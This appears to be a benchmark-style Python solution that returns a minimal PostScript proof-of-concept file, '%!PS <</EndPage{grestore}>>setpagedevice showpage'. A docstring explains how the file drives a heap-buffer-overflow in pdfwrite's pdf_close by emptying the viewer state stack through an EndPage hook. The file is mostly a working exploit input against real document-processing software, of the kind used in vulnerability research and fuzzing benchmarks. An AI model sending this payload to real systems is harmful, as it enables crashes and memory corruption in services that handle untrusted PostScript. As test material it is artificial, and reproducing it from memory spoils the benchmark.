class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap-buffer-overflow in pdfwrite's `pdf_close`
        function. It occurs because the code unconditionally attempts to restore
        the viewer state, assuming the state stack is not empty. A crafted
        PostScript input can manipulate this state stack to be empty when
        `pdf_close` is called.

        Normally, the PostScript interpreter would catch an unbalanced `grestore`
        operation (a "pop" from the graphics state stack) and throw an error.
        However, the vulnerability can be triggered by placing the `grestore`
        call inside a page device procedure, such as `EndPage`. This hook is
        executed by the device machinery during a `showpage` operation,
        bypassing the interpreter's normal checks.

        The PoC works as follows:
        1. A pdfwrite device is initialized, saving an initial state and setting its
           internal viewer state stack depth to 1.
        2. A custom `EndPage` procedure containing just `grestore` is set using
           `setpagedevice`.
        3. `showpage` is called, which triggers the `EndPage` procedure at the
           end of page processing.
        4. The `grestore` in `EndPage` is executed at the device level,
           decrementing the internal viewer state stack depth to 0.
        5. After the PostScript file is fully processed, the `pdf_close`
           function for the device is called.
        6. `pdf_close` unconditionally calls `pdf_restore_viewer_state`, which
           attempts to pop from the now-empty state stack (accessing index -1),
           causing the heap-buffer-overflow.

        This PoC is a minimal PostScript file that sets up this exact scenario.
        """
        # This PostScript code sets an EndPage procedure that executes 'grestore',
        # then calls 'showpage' to trigger it. This unbalances the graphics
        # state stack for the pdfwrite device, leading to a crash on exit.
        # Using %!PS instead of %%!PS makes the file one byte smaller.
        # Spaces are used as minimal token separators.
        poc = b"%!PS <</EndPage{grestore}>>setpagedevice showpage"
        return poc
